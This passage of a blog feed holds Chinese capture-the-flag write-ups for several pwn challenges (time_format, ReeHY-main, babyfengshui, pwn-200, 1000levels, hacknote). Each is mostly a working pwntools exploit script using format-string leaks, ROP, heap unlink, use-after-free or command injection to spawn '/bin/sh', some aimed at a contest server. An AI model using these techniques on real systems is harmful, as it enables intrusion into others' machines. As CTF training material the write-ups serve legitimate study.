class="number">52</span>+p64(canary)+<span class="string">'A'</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(base_addr+<span class="number">0x970</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">"Are you sure want to play the game?\n"</span>,<span class="string">"1"</span>)</span><br><span class="line">payload=<span class="string">'%19$p'</span></span><br><span class="line">payload=payload.ljust(<span class="number">28</span>,<span class="string">'A'</span>)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">p.sendafter(<span class="string">"Input your name : \n"</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> array:</span><br><span class="line">    p.recvuntil(<span class="string">"Now guess:"</span>)</span><br><span class="line">    p.sendline(str(i))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Correct!\n"</span>)</span><br><span class="line">libc_start_main=eval(p.recv(<span class="number">14</span>))<span class="number">-240</span></span><br><span class="line">success(<span class="string">"libc_start_main ==&gt; 0x%x"</span>%libc_start_main)</span><br><span class="line"></span><br><span class="line">system_addr=base_addr+elf.plt[<span class="string">"system"</span>]</span><br><span class="line">foot=base_addr+<span class="number">0xDAA</span></span><br><span class="line">init=base_addr+<span class="number">0xD90</span></span><br><span class="line">puts_plt=elf.plt[<span class="string">"puts"</span>]+base_addr</span><br><span class="line">puts_got=elf.got[<span class="string">"read"</span>]+base_addr</span><br><span class="line">read_plt=elf.plt[<span class="string">"read"</span>]+base_addr</span><br><span class="line">read_got=elf.got[<span class="string">"read"</span>]+base_addr</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'A'</span>*<span class="number">52</span>+p64(canary)+<span class="string">'A'</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(foot)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(read_got)</span><br><span class="line">payload+=p64(<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(elf.bss()+base_addr)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(init)</span><br><span class="line">payload+=<span class="string">'A'</span>*<span class="number">56</span></span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(elf.bss()+base_addr)</span><br><span class="line">payload+=p64(system_addr)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;立雪&quot;&gt;&lt;a href=&quot;#立雪&quot; class=&quot;headerlink&quot; title=&quot;立雪&quot;&gt;&lt;/a&gt;立雪&lt;/h1&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span
      
    
    </summary>
    
    
      <category term="Writeup" scheme="http://Whali3n51.github.io/categories/Writeup/"/>
    
    
      <category term="stack_overflow" scheme="http://Whali3n51.github.io/tags/stack-overflow/"/>
    
      <category term="unlink" scheme="http://Whali3n51.github.io/tags/unlink/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界高手进阶PWN（２）</title>
    <link href="http://whali3n51.github.io/2019/09/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6PWN(2)/"/>
    <id>http://whali3n51.github.io/2019/09/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6PWN(2)/</id>
    <published>2019-09-01T03:09:00.000Z</published>
    <updated>2020-01-08T07:05:01.441Z</updated>
    
    <content type="html"><![CDATA[<p>懒得写思路，就写一些关键的思路和该注意的地方，最近做的题都没总结。今天就好好总结一下。</p><h2 id="time-format"><a href="#time-format" class="headerlink" title="time format"></a>time format</h2><p>没什么好说的,easy.但是我觉得好的思路就是学会用’;’来分割参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote('111.198.29.45',53977)</span></span><br><span class="line">p=process(<span class="string">'./time_format'</span>)</span><br><span class="line">elf=ELF(<span class="string">'./time_format'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_format</span><span class="params">(content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Format: '</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_value</span><span class="params">(content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Time zone: '</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_format</span><span class="params">()</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'5'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Are you sure you want to exit (y/N)? '</span>,<span class="string">'n'</span>)</span><br><span class="line"></span><br><span class="line">set_format(<span class="string">"%c"</span>)</span><br><span class="line">set_value(<span class="string">"\'"</span>+<span class="string">";/bin/sh #"</span>+<span class="string">"\\"</span>)</span><br><span class="line"></span><br><span class="line">delete_format()</span><br><span class="line">gdb.attach(p)</span><br><span class="line">set_value(<span class="string">"\'"</span>+<span class="string">";/bin/sh #"</span>+<span class="string">"\\"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'4'</span>)</span><br><span class="line"><span class="comment">#delete_format()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="4-ReeHY-main-100"><a href="#4-ReeHY-main-100" class="headerlink" title="4-ReeHY-main-100"></a>4-ReeHY-main-100</h2><p>这一题是UAF制造的unlink.大体思路是这样的，首先开辟两个unsorted bin chunk.在free掉，这两个chunk合并，在开辟一个大于先前的unsorted bin chunk的chunk,这个时候写入一个fake chunk,然后触发unlink漏洞。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process('./4-ReeHY-main')#,env=&#123;"LD_PRELOAD":'ctflibc.so.6'&#125;)</span></span><br><span class="line">p=remote(<span class="string">'111.198.29.45'</span>,<span class="number">56708</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">elf=ELF(<span class="string">'./4-ReeHY-main'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">gdb.attach(p,<span class="string">''' b *0x00400A45 0x*0400AAA *0x0400B01 '''</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"$ "</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Input size\n"</span>,str(size))</span><br><span class="line">p.sendlineafter(<span class="string">"Input cun\n"</span>,str(index))</span><br><span class="line">p.sendafter(<span class="string">"Input content\n"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"$ "</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Chose one to dele\n"</span>,str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"$ "</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Chose one to edit\n"</span>,str(index))</span><br><span class="line">p.sendafter(<span class="string">"Input the content"</span>,content)</span><br><span class="line">p.sendlineafter(<span class="string">'Input your name:'</span>,<span class="string">'whalien51'</span>)</span><br><span class="line">heap_addr=<span class="number">0x602100</span></span><br><span class="line">create(<span class="number">0</span>,<span class="number">0x200</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">create(<span class="number">1</span>,<span class="number">0x200</span>,<span class="string">"1"</span>)</span><br><span class="line">create(<span class="number">2</span>,<span class="number">0x200</span>,<span class="string">'2'</span>)</span><br><span class="line">create(<span class="number">3</span>,<span class="number">0x200</span>,<span class="string">'3'</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">512</span>+<span class="number">1</span>) + p64(heap_addr - <span class="number">0x18</span>) + p64(heap_addr - <span class="number">0x10</span>) + <span class="string">'A'</span>*(<span class="number">512</span><span class="number">-0x20</span>) + p64(<span class="number">512</span>) + p64(<span class="number">512</span>)</span><br><span class="line">create(<span class="number">2</span>,<span class="number">0x400</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">'1'</span>*<span class="number">0x18</span> + p64(elf.got[<span class="string">'free'</span>]) + p64(<span class="number">1</span>) + p64(elf.got[<span class="string">'atoi'</span>]))</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">edit(<span class="number">2</span>,p64(elf.symbols[<span class="string">'puts'</span>]))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">atoi_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">base_addr = atoi_addr - libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line">log.success(<span class="string">"libc_base====&gt;0x%x"</span>%base_addr)</span><br><span class="line">system_addr = base_addr + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p64(system_addr))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="AUL"><a href="#AUL" class="headerlink" title="AUL"></a>AUL</h2><p>这一题是来凑数的，easy。<br>连上直接os.execute(‘/bin/sh’)</p><h2 id="babyfengshui"><a href="#babyfengshui" class="headerlink" title="babyfengshui"></a>babyfengshui</h2><p>你能相信这一题给的二进制文件是错的么。害的我花大量的时间怀疑他加壳，然后我去脱壳，最后无果。然后我上搜索引擎找到了这个正确的二进制文件。<br>这一题没什么好说的，任意字节堆溢出。啥都有，easy</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#p=process('./babyfengshui')</span></span><br><span class="line">p=remote(<span class="string">'111.198.29.45'</span>,<span class="number">42708</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,length,text)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"Action:"</span>,<span class="string">'0'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"size of description: "</span>,str(size))</span><br><span class="line">p.sendlineafter(<span class="string">"name: "</span>,<span class="string">'2222'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"text length: "</span>,str(length))</span><br><span class="line">p.sendlineafter(<span class="string">"text: "</span>,text)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"Action:"</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"index: "</span>,str(index))</span><br><span class="line">p.sendlineafter(<span class="string">'text length: '</span>,str(size))</span><br><span class="line">p.sendlineafter(<span class="string">'text: '</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"Action:"</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"index: "</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"Action:"</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"index: "</span>,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x80</span>,<span class="number">0x10</span>,<span class="string">'111'</span>)</span><br><span class="line">create(<span class="number">0x80</span>,<span class="number">0x10</span>,<span class="string">'222'</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x10c</span>,<span class="number">0x19d</span>,<span class="string">'2'</span>*<span class="number">0x198</span>+p32(<span class="number">0x804b00c</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"description: "</span>)</span><br><span class="line">system_addr=u32(p.recv(<span class="number">4</span>))<span class="number">-0x049020</span>+<span class="number">0x03a940</span></span><br><span class="line">log.success(<span class="string">"0x%x"</span>%system_addr)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x19d</span>,<span class="string">'/bin/sh\x00'</span>+<span class="string">'a'</span>*(<span class="number">0x198</span><span class="number">-8</span>)+p32(<span class="number">0x804b010</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x4</span>,p32(system_addr))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn-200"><a href="#pwn-200" class="headerlink" title="pwn-200"></a>pwn-200</h2><p>这一题是一道栈溢出，ROP构造，适合初学者</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process("./pwn-200")</span></span><br><span class="line">p=remote(<span class="string">'111.198.29.45'</span>,<span class="number">43390</span>)</span><br><span class="line">elf=ELF(<span class="string">"./pwn-200"</span>)</span><br><span class="line"> </span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Welcome to XDCTF2015~!\n"</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x6c</span>+p32(<span class="number">0</span>)+p32(elf.symbols[<span class="string">'write'</span>])+p32(<span class="number">0x8048484</span>)+p32(<span class="number">1</span>)+p32(elf.got[<span class="string">'read'</span>])+p32(<span class="number">4</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">system_addr=u32(p.recv(<span class="number">4</span>))<span class="number">-0x0d4350</span>+<span class="number">0x03a940</span></span><br><span class="line">log.success(<span class="string">"read_addr====&gt;0x%x"</span>%system_addr)</span><br><span class="line"></span><br><span class="line">binsh=system_addr<span class="number">-0x03a940</span>+<span class="number">0x15902b</span></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x6c</span>+p32(<span class="number">0</span>)+p32(system_addr)+p32(<span class="number">0</span>)+p32(binsh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="1000levels"><a href="#1000levels" class="headerlink" title="1000levels"></a>1000levels</h2><p>这一题也是栈溢出，不过我个人角度这个栈溢出比上面哪一题有意思。<br>这一题开了pie,不能直接控制eip。<br>但是这一题在hint函数里面将system地址放到栈上了，但是go函数和hint共用一个栈。所以我们控制变量，保证system地址不被任意覆盖。<br>然后我们将system地址的低字节覆盖为one_gadget,然后再answer函数里面溢出，这个时候answer函数栈是在go函数栈的上面，我们直接溢出，然后我们使用vsyscall填充空余的部分直接到system地址。<br>为什么使用是vsyscall呢。因为vsyscall地址在空间中固定，里面存放着一些简单的无参函数，然后执行完就retn.对我们栈说，他就不停的把我们栈上数据当做eip执行完后就向下滑动，直到滑到system函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./100levels'</span>)</span><br><span class="line"><span class="comment">#p = remote('111.198.29.45',58601)</span></span><br><span class="line">elf = ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line"></span><br><span class="line">one_gadget = <span class="number">0x4526a</span></span><br><span class="line">system_offset = elf.symbols[<span class="string">'system'</span>]</span><br><span class="line">vsyscall_addr = <span class="number">0xffffffffff600000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># hint()</span></span><br><span class="line">p.sendlineafter(<span class="string">'Choice:\n'</span>,<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># go()</span></span><br><span class="line">p.sendlineafter(<span class="string">'Choice:\n'</span>,<span class="string">'1'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil()</span><br><span class="line"><span class="comment">#这里控制system不能随便被覆盖了</span></span><br><span class="line">p.sendlineafter(<span class="string">'How many levels?\n'</span>,<span class="string">'0'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Any more?\n'</span>)</span><br><span class="line"><span class="comment">#这里讲system低地址覆盖为one_gadget地址</span></span><br><span class="line">p.sendline(str(one_gadget-system_offset))</span><br><span class="line"></span><br><span class="line"><span class="comment"># question  这里不能进行栈溢出，这里进行递归，为了保持栈平衡，前99次不能进行，最后一次进行栈溢出</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">99</span>):</span><br><span class="line">    p.recvuntil(<span class="string">"Question: "</span>)</span><br><span class="line">    a = int(p.recvuntil(<span class="string">" "</span>)[:<span class="number">-1</span>])</span><br><span class="line">    p.recvuntil(<span class="string">"* "</span>)</span><br><span class="line">    b = int(p.recvuntil(<span class="string">" "</span>)[:<span class="number">-1</span>])</span><br><span class="line">    p.sendlineafter(<span class="string">"Answer:"</span>, str(a * b))</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">0x30</span></span><br><span class="line">payload += <span class="string">'B'</span> * <span class="number">8</span>  </span><br><span class="line"><span class="comment">#这里用来填充，直到滑到存放system的地址处来绕过pie</span></span><br><span class="line">payload += p64(vsyscall_addr) * <span class="number">3</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendafter(<span class="string">"Answer:"</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="hacknote"><a href="#hacknote" class="headerlink" title="hacknote"></a>hacknote</h2><p>你能相信这一题没给二进制文件吗。我真的是醉了，越往后面做就觉得主办方越来越不用心。这一题我在搜素引擎上找到了。他将一个用来打印的函数放在堆上，这个放打印函数的chunk为fastbin,而且这一题存在UAF漏洞。我们只需要巧妙的控制fastbin的分配，我们就能得到这个存放chunk。这个时候我们保持这个地址不变，泄露出got表，确定服务器的libc和libc_base。然后释放后重新分配，然后把打印函数地址改为system地址。但是这里要注意的事参数要用’;’分割，因为传进去的参数是我们存放system地址的地址。所以用’;bin/sh’，其中’;’用来分割。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#p=process('./hacknote')</span></span><br><span class="line">p=remote(<span class="string">'111.198.29.45'</span>, <span class="number">40750</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc6-i386_2.23-0ubuntu10_amd64.so'</span>)</span><br><span class="line"><span class="comment">#libc=ELF('')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"Your choice :"</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Note size :"</span>,str(size))</span><br><span class="line">p.sendafter(<span class="string">"Content :"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"Your choice :"</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Index :"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"Your choice :"</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Index :"</span>,str(index))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x78</span>,<span class="string">'a'</span>)<span class="comment">#0</span></span><br><span class="line">create(<span class="number">0xc</span>,<span class="string">'a'</span>)<span class="comment">#1</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x20</span>,p32(<span class="number">0</span>)+p32(<span class="number">0</span>))<span class="comment">#2</span></span><br><span class="line">payload=p32(<span class="number">0x0804862b</span>)+p32(<span class="number">0x804A010</span>)</span><br><span class="line">create(<span class="number">0xc</span>,payload)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">printf_addr=u32(p.recv(<span class="number">4</span>))-libc.symbols[<span class="string">'printf'</span>]</span><br><span class="line">success(<span class="string">'main_addr====&gt;0x%x'</span>%printf_addr)</span><br><span class="line"></span><br><span class="line">system_addr=printf_addr+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">create(<span class="number">0xc</span>,p32(system_addr)+<span class="string">';bin/sh\x00'</span>)<span class="comment">#4</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;懒得写思路，就写一些关键的思路和该注意的地方，最近做的题都没总结。今天就好好总结一下。&lt;/p&gt;
&lt;h2 id=&quot;time-format&quot;&gt;&lt;a href=&quot;#time-format&quot; class=&quot;headerlink&quot; title=&quot;time format&quot;&gt;&lt;/a&gt;ti
      
    
    </summary>
    
    
      <category term="Writeup" scheme="http://Whali3n51.github.io/categories/Writeup/"/>
    
    
      <category term="UAF" scheme="http://Whali3n51.github.io/tags/UAF/"/>
    
      <category term="stack_overflow" scheme="http://Whali3n51.github.io/tags/stack-overflow/"/>
    
  </entry>
  
  <entry>
    <title>关于Win10自动更新1903之后只能新建文件夹</title>
    <link href="http://whali3n51.github.io/2019/08/30/%E5%85%B3%E4%BA%8EWin10%E8%87%AA%E5%8A%A8%E6%9B%B4%E6%96%B01903%E4%B9%8B%E5%90%8E%E5%8F%AA%E8%83%BD%E6%96%B0%E5%BB%BA%E6%96%87%E4%BB%B6%E5%A4%B9/"/>
    <id>http://whali3n51.github.io/2019/08/30/%E5%85%B3%E4%BA%8EWin10%E8%87%AA%E5%8A%A8%E6%9B%B4%E6%96%B01903%E4%B9%8B%E5%90%8E%E5%8F%AA%E8%83%BD%E6%96%B0%E5%BB%BA%E6%96%87%E4%BB%B6%E5%A4%B9/</id>
    <published>2019-08-30T02:08:00.000Z</published>
    <updated>2020-01-08T07:05:10.879Z</updated>
    
